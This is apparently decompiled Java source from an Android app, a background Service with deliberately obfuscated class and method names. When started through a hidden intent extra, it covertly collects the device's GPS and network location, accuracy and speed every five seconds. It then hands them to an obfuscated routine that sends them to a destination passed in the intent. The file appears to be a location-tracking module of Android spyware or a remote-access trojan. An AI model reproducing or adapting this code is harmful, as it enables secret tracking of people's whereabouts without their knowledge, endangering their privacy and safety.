package com.appser;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import com.appser.verapq.R;

public class dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7 extends Service {
    public static LocationListener LL = null;
    public static LocationManager LM = null;
    public static double Longting = 0.0d;
    public static long d = 0;
    public static float letliudid = 0.0f;
    public static float sp = 0.0f;
    static dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7 st = null;
    public static long t = 5000;

    /* renamed from: ʾʼʾʿˈᵔঙʿ$ʿʼ  reason: contains not printable characters */
    public static double f0$;
    private String[] vul;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        String str = considerablesjoinednintensivenestateadocumentedlcourageqcriminalhnasdaqjcarryingbreservationsl9.FTX2;
        if (intent == null || !intent.hasExtra(str)) {
            return 1;
        }
        safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.p_safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5_r = getApplicationContext().getResources().getString(R.string.surprisingt56);
        this.vul = intent.getStringArrayExtra(str);
        ru();
        return 1;
    }

    private void ru() {
        try {
            LM = (LocationManager) getSystemService("location");
            LL = new LocationListener() {
                public void onProviderDisabled(String str) {
                }

                public void onProviderEnabled(String str) {
                }

                public void onStatusChanged(String str, int i, Bundle bundle) {
                }

                public void onLocationChanged(Location location) {
                    if (location != null) {
                        dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.Longting = location.getLongitude();
                        dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.f0$ = location.getLatitude();
                        dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.letliudid = location.getAccuracy();
                        dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.sp = location.getSpeed();
                        dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.this.s(dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.f0$, dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.Longting, dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.letliudid);
                        if (dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.LM.isProviderEnabled("gps")) {
                            try {
                                dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.LM.removeUpdates(dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.LL);
                            } catch (Exception unused) {
                            }
                            if (ActivityCompat.checkSelfPermission(dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.this.getApplicationContext(), "android.permission.ACCESS_FINE_LOCATION") == 0 || ActivityCompat.checkSelfPermission(dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.this.getApplicationContext(), "android.permission.ACCESS_COARSE_LOCATION") == 0) {
                                dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.LM.requestLocationUpdates("gps", dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.t, (float) dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.d, dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.LL);
                            }
                        }
                    }
                }
            };
            boolean isProviderEnabled = LM.isProviderEnabled("network");
            boolean isProviderEnabled2 = LM.isProviderEnabled("gps");
            if (!isProviderEnabled2 && !isProviderEnabled) {
                p();
            } else if (isProviderEnabled) {
                Location lastKnownLocation = LM.getLastKnownLocation("network");
                if (lastKnownLocation != null) {
                    Longting = lastKnownLocation.getLongitude();
                    f0$ = lastKnownLocation.getLatitude();
                    letliudid = lastKnownLocation.getAccuracy();
                    sp = lastKnownLocation.getSpeed();
                    s(f0$, Longting, letliudid);
                }
                LM.requestLocationUpdates("network", t, (float) d, LL);
            } else if (isProviderEnabled2) {
                Location lastKnownLocation2 = LM.getLastKnownLocation("gps");
                if (lastKnownLocation2 != null) {
                    Longting = lastKnownLocation2.getLongitude();
                    f0$ = lastKnownLocation2.getLatitude();
                    letliudid = lastKnownLocation2.getAccuracy();
                    sp = lastKnownLocation2.getSpeed();
                    s(f0$, Longting, letliudid);
                }
                LM.requestLocationUpdates("gps", t, (float) d, LL);
            }
        } catch (Exception unused) {
            Longting = 0.0d;
            f0$ = 0.0d;
            p();
        }
    }

    /* access modifiers changed from: private */
    public void s(double d2, double d3, float f) {
        outerypatientsivaliumgacquisitionsacasiootreatyqintegratingoeligibleotransactionmleonegboringj4.climatenpostersxpromptnlimitationsvbehaviornshortlysconsiderableibannersadramaticlpolicygtapx47(this.vul[1], (d2 + this.vul[0] + d3 + this.vul[0] + f + this.vul[0] + ((int) sp)).getBytes());
    }

    private void p() {
        stopService(new Intent(this, dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7.class));
    }

    public void onDestroy() {
        safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.s_safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5_f2 = 0;
        st = null;
        try {
            LM.removeUpdates(LL);
        } catch (Exception unused) {
        }
        super.onDestroy();
    }
}
